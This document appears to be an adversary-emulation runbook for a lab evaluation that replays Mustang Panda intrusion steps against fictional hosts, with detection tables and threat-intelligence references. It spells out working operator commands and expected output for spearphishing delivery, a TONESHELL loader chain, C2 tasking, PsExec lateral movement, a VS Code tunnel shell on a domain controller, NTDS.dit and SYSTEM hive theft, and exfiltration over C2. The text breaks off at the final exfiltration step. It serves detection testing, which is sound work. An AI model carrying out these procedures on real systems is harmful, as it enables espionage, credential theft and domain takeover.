# Mustang Panda Scenario

[1]:https://decoded.avast.io/threatintel/apt-treasure-trove-avast-suspects-chinese-apt-group-mustang-panda-is-collecting-data-from-burmese-government-agencies-and-opposition-groups/
[2]:https://web.archive.org/web/20250102192805/https://blogs.blackberry.com/en/2022/12/mustang-panda-uses-the-russian-ukrainian-war-to-attack-europe-and-asia-pacific-targets
[3]:https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
[5]:https://blog.talosintelligence.com/mustang-panda-targets-europe/
[6]:https://csirt-cti.net/2024/01/23/stately-taurus-targets-myanmar/
[7]:https://blog.eclecticiq.com/mustang-panda-apt-group-uses-european-commission-themed-lure-to-deliver-plugx-malware
[8]:https://www.welivesecurity.com/2022/03/23/mustang-panda-hodur-old-tricks-new-korplug-variant/
[9]:https://www.welivesecurity.com/2023/03/02/mqsttang-mustang-panda-latest-backdoor-treads-new-ground-qt-mqtt/
[11]:https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit
[12]:https://lab52.io/blog/mustang-pandas-plugx-new-variant-targetting-taiwanese-government-and-diplomats/
[13]:https://www.proofpoint.com/us/blog/threat-insight/good-bad-and-web-bug-ta416-increases-operational-tempo-against-european
[14]:https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0109.pdf
[15]:https://www.secureworks.com/blog/bronze-president-targets-government-officials
[16]:https://www.security.com/threat-intelligence/china-southeast-asia-espionage
[17]:https://www.trendmicro.com/en_us/research/24/b/earth-preta-campaign-targets-asia-doplugs.html
[18]:https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
[19]:https://jsac.jpcert.or.jp/archive/2023/pdf/JSAC2023_1_2_nick-sunny-vickie_en.pdf
[20]:https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html
[21]:https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html
[22]:https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
[23]:https://www.trendmicro.com/en_us/research/24/i/earth-preta-new-malware-and-strategies.html
[25]:https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/
[26]:https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/

## Step 0 - Setup

### Procedures

- ☣️ From your localhost, initiate an RDP session to the Kali attack host
`driftmark (174.3.0.70)` if not already established

  | Destination | Username | Password
  |  - | - | -
  | 174.3.0.70 | op1 | Barbed-Directive

- ☣️ In a new terminal window, start the simple file server, plugx,
vscode_tunnel, and toneshell handlers:

  | Password
  |  -
  | Barbed-Directive

  ```bash
  cd /opt/kalidev/mustang_panda/Resources/controlServer
  sudo ./controlServer -c config/mustang_panda.yml
  ```

  - ***Expected Output***

    ```text
    ...
    [SUCCESS] 2024/04/01 10:10:11 Started handler simplefileserver
    [SUCCESS] 2024/04/01 10:10:11 Started handler vscode_tunnel
    [SUCCESS] 2024/04/01 10:10:11 Started handler toneshell
    [SUCCESS] 2024/04/01 10:10:11 Started handler plugx
    [INFO] 2024/04/01 10:10:11 Waiting for connections
    ```

- ☣️ In a new terminal window, activate the Python virtual environment. This
should prepend your terminal prompt with `(venv)`. Use this terminal for any
Python commands run on Kali

  ```bash
  cd /opt/kalidev
  source venv/bin/activate
  ```

## Step 1 - Initial Access

### Voice Track

Mustang Panda sends an email from `fantaryon@lorath.com` to
`htargaryen@kingslanding.net` containing a .docx file attachment. `htargaryen`
opens the .docx file and clicks the link embedded in the document. `htargaryen`
downloads the password-protected RAR file hosted on the adversary server.
`htargaryen` extracts the contents of the RAR file and executes the LNK file.
The LNK file executes `EssosUpdate.exe` (renamed legitimate binary
`wsddebug_host.exe`) which side-loads `wsdapi.dll`, TONESHELL.

`wsdapi.dll` is
the TONESHELL loader and is signed by a self-signed certificate. The loader
performs several anti-analysis techniques before registering and re-executing
itself a second time via `regsvr32.exe`. After spawning a child `waitfor.exe`
process, the loader executes itself a third time by using `mavinject` to inject
itself into the spawned `waitfor.exe` process.

Once executed in the intended
`waitfor.exe` child process, TONESHELL XOR decrypts and loads the embedded
shellcode payload into memory. The shellcode discovers the computer name and
generates a GUID for the victim then connects to attacker C2 191.44.44.199 over
port 443.

### Procedures

- From the jumpbox, initiate an RDP session to the workstation `harrenhal
(10.55.4.103)` (if not already connected)

  | Destination | Username | Password
  |  - | - | -
  | harrenhal.kingslanding.net | kingslanding\htargaryen | Pidgeon-Book

- On the workstation `harrenhal (10.55.4.103)`, open Command Prompt and mount the
E: drive of `conclave (10.55.3.105)`

  ```cmd
  net use \\10.55.3.105\E$
  ```

- On the workstation `harrenhal (10.55.4.103)`, open FireFox and browse to the
Outlook Web Access portal, logging in with htargaryen's credentials

  | Destination | Username | Password
  |  - | - | -
  | <https://sept.kingslanding.net/owa> | kingslanding\htargaryen | Pidgeon-Book

- ☣️ Switch to the Kali machine, open up a shell prompt, and send the
spearphishing email

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/email_generation/send_email.py mail.lorath.com /opt/kalidev/mustang_panda/Resources/payloads/toneshell_spearphishing.html -t 'cstark@tully.org,nstark@winterfell.net,jsnow@wall.net,dtargaryen@dragonstone.com,cvelaryon@driftmark.net,lvelaryon@driftmark.net' -cc 'htargaryen@kingslanding.net,missandei@mereen.com,xdaxos@quarth.net,imopatis@pentos.net' -f fantaryon@lorath.com -fn 'Ferrego Antaryon' -s 'Westeros & Essos Cyber Summit 2025 Attendance Confirmed' -a /opt/kalidev/mustang_panda/Resources/payloads/toneshell_spearphishing.docx -an 'Strategic Competition with Pentos - Assessing Braavos Competitiveness Beyond Essos.docx'
  ```

  - ***Expected Output***

    ```text
    Successfully sent email
    ```

- Switch to the RDP to the workstation `harrenhal (10.55.4.103)` and confirm
receipt of the spearphishing email

- Open the email and download the attachment. Open the Downloads folder then
double-click to open the attachment. Then, CTRL+click on the embedded link
inside the document to initiate the download of the password-protected RAR file
`250325_Pentos_Board_Minutes.rar`

- Open the Downloads folder, right-click the RAR file then click "Show More
Options" > "WinRAR" > "Extract Here", entering the RAR password when prompted:

  | Password
  |  -
  | Pentos

- Double click to execute the .LNK file then switch windows several times to
bypass the sandbox check

- ☣️ Switch to Kali and confirm C2 registration

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | Windows | `htargaryen` received an email from fantaryon@lorath[.]com with an `Strategic Competition with Pentos - Assessing Braavos Competitiveness Beyond Essos.docx` | Not Calibrated - Not Benign | Mustang Panda sends a spearphishing attachment to `htargaryen` | harrenhal (10.55.4.103) | htargaryen | [send_email.py](../Resources/email_generation/send_email.py) | [21], [22], [6], [19]
| Execution | T1204.001 | User Execution: Malicious Link | Windows | `htargaryen` downloads/opened the .docx file and clicked on a link to http[:]//pentos-analysis[.]org | Not Calibrated - Not Benign | `htargaryen` clicks on link inside malicious attachment | harrenhal (10.55.4.103) | htargaryen | - | [21], [22], [6], [19]
| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | msedge.exe downloaded and extracts the contents of the password-protected RAR file 250325_Pentos_Board_Minutes.rar | Calibrated - Not Benign | `htargaryen` downloads and extracts the contents of the password-protected RAR file 250325_Pentos_Board_Minutes.rar | harrenhal (10.55.4.103) | htargaryen | - | [21], [22], [6], [19]
| Execution | T1204.002 | User Execution: Malicious File | Windows | `htargaryen` executes the LNK file `Essos Competitiveness Brief.lnk` | Not Calibrated - Not Benign | `htargaryen` executes the LNK file `Essos Competitiveness Brief.lnk` | harrenhal (10.55.4.103) | htargaryen | - | [21], [22], [6], [19]
| Execution | T1204.002 | User Execution: Malicious File | Windows | explorer.exe executed `EssosUpdate.exe` (renamed legitimate binary `wsddebug_host.exe`) | Not Calibrated - Not Benign | LNK file `Essos Competitiveness Brief.lnk` executes `EssosUpdate.exe` (renamed legitimate binary `wsddebug_host.exe`) | harrenhal (10.55.4.103) | htargaryen | - | [21], [22], [6], [19]
| Defense Evasion | T1574.002 | Hijack Execution Flow: DLL Side-Loading | Windows | `EssosUpdate.exe` side-loads `wsdapi.dll` | Calibrated - Not Benign | `EssosUpdate.exe` (renamed legitimate binary `wsddebug_host.exe`) side-loads the TONESHELL loader DLL `wsdapi.dll` | harrenhal (10.55.4.103) | htargaryen | [DLL exports](../Resources/toneshell/src/wsdapi/wsdapi.def), [Exported function definitions](../Resources/toneshell/src/wsdapi/dllmain.cpp#L63-L131) | [21], [22], [6], [19]
| Defense Evasion | T1553.002 | Subvert Trust Controls: Code Signing | Windows | `wsdapi.dll` is signed with a self-signed cert | Calibrated - Not Benign | TONESHELL loader DLL `wsdapi.dll` is signed with a self-signed certificate | harrenhal (10.55.4.103) | htargaryen | [DLL signed at build](../Resources/toneshell/src/wsdapi/CMakeLists.txt#L46), [Signing script](../Resources/toneshell/src/common/sign_artifact.ps1) | [21], [22], [6], [19]
| Defense Evasion | T1497 | Virtualization/Sandbox Evasion | Windows | `wsdapi.dll` checks if the current process name matches `EssosUpdate.exe` using GetModuleFileNameW | Not Calibrated - Not Benign | TONESHELL loader checks if the current process name matches `EssosUpdate.exe` using GetModuleFileNameW | harrenhal (10.55.4.103) | htargaryen | [VerifyProcessName](../Resources/toneshell/src/common/checks.cpp#L4-L38) | [22]
| Defense Evasion | T1622 | Debugger Evasion | Windows | `wsdapi.dll` uses custom execeptions to hinder debuggers | Not Calibrated - Not Benign | TONESHELL loader uses custom exceptions to hinder debuggers | harrenhal (10.55.4.103) | htargaryen | [Throw custom exception](../Resources/toneshell/src/common/handler.cpp#L181-L194) | [22]
| Defense Evasion | T1497 | Virtualization/Sandbox Evasion | Windows | `wsdapi.dll` checks for changes to the foreground window | Not Calibrated - Not Benign | TONESHELL loader checks for changes to the foreground window | harrenhal (10.55.4.103) | htargaryen | [ForegroundWindowCheck](../Resources/toneshell/src/common/checks.cpp#L40-L86) | [22]
| Defense Evasion | T1218.010 | System Binary Proxy Execution: Regsvr32 | Windows | `EssosUpdate.exe` executed regsvr32.exe to register and load `wsdapi.dll` | Not Calibrated - Not Benign | TONESHELL loader registers and re-executes itself using `regsvr32.exe /s` | harrenhal (10.55.4.103) | htargaryen | [RegisterSelf](../Resources/toneshell/src/common/register.cpp#L43-L109) | [18]
| Defense Evasion | T1218.013 | System Binary Proxy Execution: Mavinject | Windows | `regsvr32.exe` spawns `waitfor.exe` then executes `mavinject` to inject the `wsdapi.dll` into `waitfor.exe` | Not Calibrated - Not Benign | `regsvr32.exe` spawns `waitfor.exe` then executes `mavinject` to inject the TONESHELL loader DLL `wsdapi.dll` into `waitfor.exe` | harrenhal (10.55.4.103) | htargaryen | [DllRegisterServer](../Resources/toneshell/src/common/register.cpp#L112-L236) | [18]
| Defense Evasion | T1027.009 | Obfuscated Files or Information: Embedded Payloads | Windows | `wsdapi.dll` contains embedded shellcode in the data section | Not Calibrated - Not Benign | TONESHELL loader DLL `wsdapi.dll` contains embedded shellcode in the data section | harrenhal (10.55.4.103) | htargaryen | [Embedded Payload Header Template](../Resources/toneshell/src/common/embedded.hpp.in), [Embed shellcode at build time](../Resources/toneshell/src/shellcode/CMakeLists.txt#L74-L88), [Payload Embed Script](../Resources/toneshell/src/common/embed_payload.ps1) | [18], [22]
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `wsdapi.dll` XOR decrypts embedded shellcode | Calibrated - Not Benign | TONESHELL loader XOR decrypts embedded shellcode | harrenhal (10.55.4.103) | htargaryen | [Xor Functions](../Resources/toneshell/src/common/xor.cpp), [Decrypt shellcode](../Resources/toneshell/src/common/handler.cpp#L91) | [18], [22]
| Defense Evasion | T1620 | Reflective Code Loading | Windows | `wsdapi.dll` reflectively loads and executes the shellcode  | Calibrated - Not Benign | TONESHELL loader reflectively loads and executes the shellcode | harrenhal (10.55.4.103) | htargaryen | [Execute shellcode](../Resources/toneshell/src/common/handler.cpp#L78-L100) | [18], [22]
| Discovery | T1082 | System Information Discovery | Windows | waitfor.exe discovers computer name via GetComputerNameA | Not Calibrated - Not Benign | TONESHELL discovers computer name via GetComputerNameA | harrenhal (10.55.4.103) | htargaryen | [GetHostname](../Resources/toneshell/src/shellcode/shellcode_util.cpp#L320-L344) | [18], [22]
| Defense Evasion | T1106 | Native API | Windows | waitfor.exe creates a random GUID using CoCreateGuid | Not Calibrated - Not Benign | TONESHELL creates a random GUID using CoCreateGuid | harrenhal (10.55.4.103) | htargaryen | [GenerateNewVictimID](../Resources/toneshell/src/shellcode/shellcode_util_id_d.cpp#L7-L34) | [18], [22]
| Command and Control | T1095 | Non-Application Layer Protocol | Windows | waitfor.exe connects to `191.44.44.199`over TCP port 443 | Not Calibrated - Not Benign | TONESHELL connects to `191.44.44.199`over TCP port 443 | harrenhal (10.55.4.103) | htargaryen | [PerformHandshake](../Resources/toneshell/src/shellcode/comms.cpp#L114-L153), [connectSocket](../Resources/toneshell/src/shellcode/comms.cpp#L59-L85), [Set server and port at build time](../Resources/toneshell/src/shellcode/CMakeLists.txt#L59-L60) | [18], [20], [22], [11]
| Execution | T1106 | Native API | Windows | waitfor.exe uses ws2_32 `send` API to connect to C2 | Not Calibrated - Not Benign | TONESHELL uses ws2_32 `send` API to connect to C2 | harrenhal (10.55.4.103) | htargaryen | [sendClientMsg](../Resources/toneshell/src/shellcode/comms.cpp#L17-L36) | [18], [20]

## Step 2 - Discovery

### Voice Track

Mustang Panda then uses TONESHELL to perform network discovery on the workstation
`harrenhal (10.55.4.103)`. Mustang Panda uses `netstat` and `SharpNBTScan` to discover
the file server `conclave (10.55.3.105)` and domain controller `redkeep
(10.55.3.100)`.

### Procedures

- ☣️ Task TONESHELL to execute `netstat` to discover a network connection to
`conclave (10.55.3.105)`

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 5, "taskNum": 1, "args": "netstat -anop tcp"}'
  ```

  - ***Expected Output***

    ```text
    Active Connections

      Proto   Local Address     Foreign Address   State...
    ```

- ☣️ Task TONESHELL to execute `ipconfig` to discover the subnet mask of the network

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 5, "taskNum": 2, "args": "ipconfig /all"}'
  ```

  - ***Expected Output***

    ```text
    Windows IP Configuration

       Host Name . . . . . . . . . . . . : harrenhal
       Primary Dns Suffix  . . . . . . . : kingslanding.net
       Node Type . . . . . . . . . . . . : Hybrid
       IP Routing Enabled. . . . . . . . : No
       WINS Proxy Enabled. . . . . . . . : No
       DNS Suffix Search List. . . . . . : us-east-1.ec2-utilities.amazonaws.com
                                           kingslanding.net

    Ethernet adapter Ethernet 2:
    Connection-specific DNS Suffix  . :
       Description . . . . . . . . . . . : Amazon Elastic Network Adapter
       Physical Address. . . . . . . . . : 0A-FF-E3-74-79-9D
       DHCP Enabled. . . . . . . . . . . : Yes
       Autoconfiguration Enabled . . . . : Yes
       Link-local IPv6 Address . . . . . : fe80::2cad:8638:2bd1:fe7b%5(Preferred)
       IPv4 Address. . . . . . . . . . . : 10.55.4.103(Preferred)
       Subnet Mask . . . . . . . . . . . : 255.255.255.128
       Lease Obtained. . . . . . . . . . : Friday, June 6, 2025 11:01:08 AM
       Lease Expires . . . . . . . . . . : Friday, June 6, 2025 8:01:09 PM
       Default Gateway . . . . . . . . . : 10.55.4.1
       DHCP Server . . . . . . . . . . . : 10.55.4.1
       DHCPv6 IAID . . . . . . . . . . . : 118924644
       DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2C-ED-A4-EE-08-00-27-A3-42-54
       DNS Servers . . . . . . . . . . . : 10.55.3.100
       NetBIOS over Tcpip. . . . . . . . : Enabled
    ```

- ☣️ Task TONESHELL to download SharpNBTScan

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 3, "taskNum": 3, "payload": "SharpNBTScan.exe", "args": "mswin1.exe"}'
  ```

  - ***Expected Output***

    ```text
      [DEBUG] 2025/07/29 13:17:08 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
       [INFO] 2025/07/29 13:17:17 Received SetTaskBySessionId request
    [SUCCESS] 2025/07/29 13:17:17 Successfully set task for session: b7107b26bdc8e2eea0dc91c8e603370f
      [DEBUG] 2025/07/29 13:17:18 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
      [DEBUG] 2025/07/29 13:17:18 [TONESHELL] Received file chunk request from session ID b7107b26bdc8e2eea0dc91c8e603370f
       [INFO] 2025/07/29 13:17:18 [TONESHELL] Sent file chunk to session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 3: 13824 bytes
      [DEBUG] 2025/07/29 13:17:18 [TONESHELL] Closed handle for file /opt/kalidev/mustang_panda/Resources/payloads/SharpNBTScan.exe
       [INFO] 2025/07/29 13:17:18 [TONESHELL] Received task complete response from session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 3; task type: 3, exit code: 0. Registering task output.
    [SUCCESS] 2025/07/29 13:17:18 [TONESHELL] Successfully downloaded file /opt/kalidev/mustang_panda/Resources/payloads/SharpNBTScan.exe
      [DEBUG] 2025/07/29 13:17:28 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
      [DEBUG] 2025/07/29 13:17:38 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
    ```

- ☣️ Task TONESHELL to execute SharpNBTScan to discover other workstations in the
domain

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 5, "taskNum": 4, "args": "mswin1.exe 10.55.4.0/24"}'
  ```

  - ***Expected Output***

    ```text
    [*]Start udp client...
    [+] ip range 10.55.4.1 - 10.55.4.254
    [*]Udp client will stop in 10s ...
    10.55.4.104    KINGSLANDING\STEPSTONES
    10.55.4.101    KINGSLANDING\FLEABOTTOM
    10.55.4.102    KINGSLANDING\FISHMONGER
    [*]Stop udp client ...
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Discovery | T1049 | System Network Connections Discovery | Windows | waitfor.exe executes `netstat -anop tcp` | Not Calibrated - Not Benign | TONESHELL executes `netstat -anop tcp` | harrenhal (10.55.4.103) | htargaryen | [PerformExecTask](../Resources/toneshell/src/shellcode/exec.cpp#L152-L239) | [16], [17], [23]
| Discovery | T1016 | System Network Configuration Discovery | Windows | waitfor.exe executes `ipconfig /all` | Not Calibrated - Not Benign | TONESHELL executes `ipconfig /all` | harrenhal (10.55.4.103) | htargaryen | [PerformExecTask](../Resources/toneshell/src/shellcode/exec.cpp#L152-L239) | [17]
| Command and Control | T1105 | Ingress Tool Transfer | Windows | waitfor.exe downloaded SharpNBTScan as `mswin1.exe` | Not Calibrated - Not Benign | TONESHELL downloads SharpNBTScan as `mswin1.exe` | harrenhal (10.55.4.103) | htargaryen | [PerformFileDownloadTask](../Resources/toneshell/src/shellcode/exec.cpp#L241-L346) | [16], [26]
| Discovery | T1018 | Remote System Discovery | Windows | waitfor.exe executed SharpNBTScan `mswin1.exe` against `10.55.4.0/24` | Not Calibrated - Not Benign | TONESHELL executes SharpNBTScan `mswin1.exe` against `10.55.4.0/24` | fleabottom (10.55.4.101), fishmonger (10.55.4.102), harrenhal (10.55.4.103), stepstones (10.55.4.104) | htargaryen | [PerformExecTask](../Resources/toneshell/src/shellcode/exec.cpp#L152-L239) | [16], [26]

## Step 3 - Lateral Movement

### Voice Track

After discovering the domain controller `redkeep (10.55.3.100)`, Mustang Panda uses
TONESHELL to perform lateral movement via PsExec to pivot to the domain controller
in preparation for credential dumping. TONESHELL uses PsExec to execute the VS
Code tunnel batch script on the domain controller to establish a remote shell.

### Procedures

- ☣️ Task TONESHELL to download the VS Code tunnel batch script to
`C:\\users\\htargaryen\\AppData\\Local\\CodeHelper.bat`

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 3,  "taskNum": 5, "payload": "startcode.bat", "args": "C:\\users\\htargaryen\\AppData\\Local\\CodeHelper.bat"}'
  ```

  - ***Expected Output***

    ```text
      [DEBUG] 2025/07/29 13:24:39 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
      [DEBUG] 2025/07/29 13:24:49 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
       [INFO] 2025/07/29 13:24:54 Received SetTaskBySessionId request
    [SUCCESS] 2025/07/29 13:24:54 Successfully set task for session: b7107b26bdc8e2eea0dc91c8e603370f
      [DEBUG] 2025/07/29 13:24:59 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
      [DEBUG] 2025/07/29 13:24:59 [TONESHELL] Received file chunk request from session ID b7107b26bdc8e2eea0dc91c8e603370f
       [INFO] 2025/07/29 13:24:59 [TONESHELL] Sent file chunk to session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 5: 797 bytes
      [DEBUG] 2025/07/29 13:24:59 [TONESHELL] Closed handle for file /opt/kalidev/mustang_panda/Resources/payloads/startcode.bat
       [INFO] 2025/07/29 13:24:59 [TONESHELL] Received task complete response from session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 5; task type: 3, exit code: 0. Registering task output.
    [SUCCESS] 2025/07/29 13:24:59 [TONESHELL] Successfully downloaded file /opt/kalidev/mustang_panda/Resources/payloads/startcode.bat
      [DEBUG] 2025/07/29 13:25:09 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
      [DEBUG] 2025/07/29 13:25:19 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
    ```

- ☣️ Task TONESHELL with executing the VS Code tunnel batch script via PsExec on the
domain controller `redkeep (10.55.3.100)`. Switch to the control server output
and confirm receipt of an authentication code from the VSCODE_TUNNEL handler

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 5, "taskNum": 6, "args": "psexec \\\\10.55.3.100 -accepteula -d -c C:\\users\\htargaryen\\AppData\\Local\\CodeHelper.bat"}'
  ```

  - ***Expected Output***

    ```text
    [SUCCESS] 2025/04/15 15:28:42 [VSCODE_TUNNEL] USE AUTHENTICATION CODE: XXXX-XXXX
    ```

- ☣️ Open a new tab in Chrome on Kali and browse to the GitHub authentication
portal and sign into the adversary GitHub account.

  | Destination
  |  -
  | <https://github.com/login/device>

- ☣️ Enter the retrieved GitHub login device code then "Authorize
Visual-Studio-Code" if prompted.

- ☣️ In a new browser tab, browse to access the VS Code tunnel. When prompted with
"What type of account did you use to start this tunnel?" select GitHub > Allow >
Continue > Authorize Visual-Studio-Code if prompted. Wait until the VS Code
tunnel as connected successfully and the tunnel in the bottom left reads
`redkeep`

  | Destination
  |  -
  | <https://vscode.dev/tunnel/redkeep>

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | waitfor.exe downloaded VS Code tunnel batch script `CodeHelper.bat` | Not Calibrated - Not Benign | TONESHELL downloads VS Code tunnel batch script `CodeHelper.bat` | harrenhal (10.55.4.103) | htargaryen | [PerformFileDownloadTask](../Resources/toneshell/src/shellcode/exec.cpp#L241-L346) | [5], [25]
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | waitfor.exe executed PsExec and connected to ADMIN$ share on the domain controller `redkeep (10.55.3.100)` | Not Calibrated - Not Benign | TONESHELL executes PsExec and connects to ADMIN$ share on the domain controller `redkeep (10.55.3.100)` | harrenhal (10.55.4.103), redkeep (10.55.3.100) | htargaryen | [PerformExecTask](../Resources/toneshell/src/shellcode/exec.cpp#L152-L239) | [26]
| Execution | T1543.003 | Create or Modify System Process: Windows Service | Windows | PsExec created PSEXESVC on the domain controller `redkeep (10.55.3.100)` | Not Calibrated - Not Benign | PsExec creates PSEXESVC on the domain controller `redkeep (10.55.3.100)` | redkeep (10.55.3.100) | htargaryen | - | [26]
| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | PsExec copies `CodeHelper.bat` to the domain controller `redkeep (10.55.3.100)` | Not Calibrated - Not Benign | PsExec copies `CodeHelper.bat` to the domain controller `redkeep (10.55.3.100)` | redkeep (10.55.3.100) | htargaryen | - | [26]
| Execution | T1569.002 | System Services: Service Execution | Windows | PsExec executes `CodeHelper.bat` on the domain controller `redkeep (10.55.3.100)` | Not Calibrated - Not Benign | PsExec executes `CodeHelper.bat` on the domain controller `redkeep (10.55.3.100)` | redkeep (10.55.3.100) | htargaryen | [startcode.bat](../Resources/payloads/startcode.bat) | [26]
| Command and Control | T1572 | Protocol Tunneling | Windows | `CodeHelper.bat` executed cmd.exe to establish a tunnel (`code-tunnel.exe`) | Calibrated - Not Benign | Mustang Panda uses VS Code to establish a tunnel | redkeep (10.55.3.100) | htargaryen | [startcode.bat](../Resources/payloads/startcode.bat) | [26]
| Lateral Movement | T1021.004 | Remote Services: SSH | Windows | htargaryen authenticated to github through `code-tunnel.exe` | Calibrated - Not Benign | Mustang Panda authenticates with GitHub to connect to the tunnel | redkeep (10.55.3.100) | htargaryen | - | [26]

## Step 4 - Credential Access

### Voice Track

Using the VS Code tunnel on the domain controller `redkeep (10.55.3.100)`,
Mustang Panda uses `vssadmin` and `reg save` to perform credential dumping via NTDS.
Mustang Panda uses the VS Code tunnel on the domain controller to stage the necessary
NTDS.dit and SYSTEM hive files back on the initially compromised workstation
`harrenhal (10.55.4.103)`. Then, Mustang Panda uses OPRHEUS to exfiltrate the NTDS
files over its existing C2 for offline cracking.

### Procedures

- ☣️ Using the VS Code tunnel on the domain controller `redkeep (10.55.3.100)`,
click the Search bar > Show and Run Commands > type and select "Create New
Terminal (With Profile)" > select "PowerShell" to open a PowerShell
terminal.Then execute the following command to create a volume shadow copy of
the domain controller's C:\ drive. If vscode.dev asks for clipboard permissions,
click Allow. Take note of the number following `HarddiskVolumeShadowCopy` for
use in a future command

  ```cmd
  vssadmin create shadow /for=c: /autoretry=10
  ```

  - ***Expected Output***

    ```text
    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
    (C) Copyright 2001-2013 Microsoft Corp.

    Successfully created shadow copy for 'c:\'
        Shadow Copy ID: {b4d78609-974e-4f64-a39c-d9d8c2196b47}
        Shadow Copy Volume Name: \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5
    ```

- ☣️ Using the VS Code tunnel on the domain controller `redkeep (10.55.3.100)`,
execute `net use` to mount the C: drive of the initial workstation `harrenhal
(10.55.4.103)`. When prompted for a username and password use the credentials
below. **NOTE: password has been whitecarded for this scenario**

  | Username | Password
  |  - | -
  | kingslanding\htargaryen | Pidgeon-Book

  ```cmd
  net use \\10.55.4.103\C$
  ```

  - ***Expected Output***

    ```text
    The command completed successfully
    ```

- ☣️ Using the VS Code tunnel on the domain controller `redkeep (10.55.3.100)`,
copy the NTDS.dit file from the shadow copy back to the initial workstation
`harrenhal (10.55.4.103)`. Update the command below to copy the ID of the volume
shadow copy created in the earlier step

  ```cmd
  cmd /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<REPLACE_ID>\Windows\NTDS\NTDS.dit \\10.55.4.103\C$\windows\temp\ntds.dit"
  ```

  - ***Expected Output***

    ```text
    1 file(s) copied
    ```

- ☣️ Using the VS Code tunnel on the domain controller `redkeep (10.55.3.100)`,
save the System hive to the workstation `harrenhal (10.55.4.103)`

  ```cmd
  reg save hklm\system \\10.55.4.103\C$\windows\temp\system.hive
  ```

  - ***Expected Output***

    ```text
    The operation completed successfully.
    ```

- ☣️ Using the VS Code tunnel on the domain controller `redkeep (10.55.3.100)`,
delete the mounted C: drive

  ```cmd
  net use /delete \\10.55.4.103\C$
  ```

  - ***Expected Output***

    ```text
    \\10.55.4.103\C$ was deleted successfully.
    ```

- ☣️ Return to the Kali terminal and task TONESHELL with exfiltrating the SYSTEM
hive

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 7,  "taskNum": 7, "args": "C:\\windows\\temp\\system.hive"}'
  ```

  - ***Expected Output***

    ```text
    Successfully saved uploaded file as system.hive
    ```

- ☣️ From the Kali terminal, task TONESHELL with exfiltrating the NTDS.dit file

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 7, "taskNum": 8, "args": "C:\\windows\\temp\\ntds.dit"}'
  ```

  - ***Expected Output***

